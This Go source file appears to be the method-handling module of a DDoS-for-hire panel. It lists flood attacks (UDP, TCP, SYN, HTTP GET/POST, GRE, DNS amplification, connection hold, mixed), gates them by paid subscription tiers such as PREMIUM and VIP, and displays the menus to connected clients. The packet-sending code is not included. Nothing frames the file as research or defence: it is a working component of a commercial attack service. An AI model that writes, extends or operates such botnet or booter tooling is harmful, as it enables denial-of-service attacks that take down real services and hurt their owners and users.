package handlers

import (
	"fmt"
	"net"
	"strings"
)

// MethodInfo holds attack method details
type MethodInfo struct {
	Name        string
	Description string
	Plan        string // VIP, PREMIUM, USER, ALL
}

// Available attack methods
var Methods = []MethodInfo{
	{Name: "udp", Description: "UDP bypass flood", Plan: "ALL"},
	{Name: "tcp", Description: "TCP bypass flood", Plan: "ALL"},
	{Name: "syn", Description: "SYN flood", Plan: "ALL"},
	{Name: "httpget", Description: "HTTP GET flood", Plan: "PREMIUM"},
	{Name: "httppost", Description: "HTTP POST flood", Plan: "PREMIUM"},
	{Name: "gre", Description: "GRE/IPIP flood", Plan: "VIP"},
	{Name: "dns", Description: "DNS amplification", Plan: "VIP"},
	{Name: "hold", Description: "Connection hold", Plan: "PREMIUM"},
	{Name: "mix", Description: "Mixed attack", Plan: "PREMIUM"},
}

// GetMethodsByPlan returns methods allowed for a specific plan
func GetMethodsByPlan(plan string) []MethodInfo {
	var result []MethodInfo
	for _, m := range Methods {
		if m.Plan == "ALL" || m.Plan == plan {
			result = append(result, m)
		}
	}
	return result
}

// GetMethodByName returns method info by name
func GetMethodByName(name string) *MethodInfo {
	for _, m := range Methods {
		if strings.EqualFold(m.Name, name) {
			return &m
		}
	}
	return nil
}

// IsMethodAllowed checks if a method is allowed for a plan
func IsMethodAllowed(methodName, plan string) bool {
	method := GetMethodByName(methodName)
	if method == nil {
		return false
	}
	return method.Plan == "ALL" || method.Plan == plan
}

// ShowMethods displays all attack methods
func ShowMethods(conn net.Conn) {
	conn.Write([]byte("\n"))
	conn.Write([]byte("udp       UDP bypass flood\n"))
	conn.Write([]byte("tcp       TCP bypass flood\n"))
	conn.Write([]byte("syn       SYN flood\n"))
	conn.Write([]byte("httpget   HTTP GET flood\n"))
	conn.Write([]byte("httppost  HTTP POST flood\n"))
	conn.Write([]byte("gre       GRE/IPIP flood\n"))
	conn.Write([]byte("dns       DNS amplification\n"))
	conn.Write([]byte("hold      Connection hold\n"))
	conn.Write([]byte("mix       Mixed attack\n"))
	conn.Write([]byte("\n"))
}

// ShowMethodsByPlan displays methods allowed for a specific plan
func ShowMethodsByPlan(conn net.Conn, plan string) {
	conn.Write([]byte("\n"))
	conn.Write([]byte(fmt.Sprintf("Methods for %s plan:\n", plan)))
	conn.Write([]byte("----------------------------------------\n"))

	methods := GetMethodsByPlan(plan)
	if len(methods) == 0 {
		conn.Write([]byte("  No methods available.\n"))
		conn.Write([]byte("\n"))
		return
	}

	for _, m := range methods {
		conn.Write([]byte(fmt.Sprintf("  %-8s - %s\n", m.Name, m.Description)))
	}
	conn.Write([]byte("\n"))
}

// IsValidMethod checks if a method name is valid
func IsValidMethod(name string) bool {
	return GetMethodByName(name) != nil
}

// GetMethodNames returns a list of all method names
func GetMethodNames() []string {
	var names []string
	for _, m := range Methods {
		names = append(names, m.Name)
	}
	return names
}

// GetDefaultMethods returns methods for new users
func GetDefaultMethods() []string {
	var result []string
	for _, m := range Methods {
		if m.Plan == "ALL" || m.Plan == "USER" {
			result = append(result, m.Name)
		}
	}
	return result
}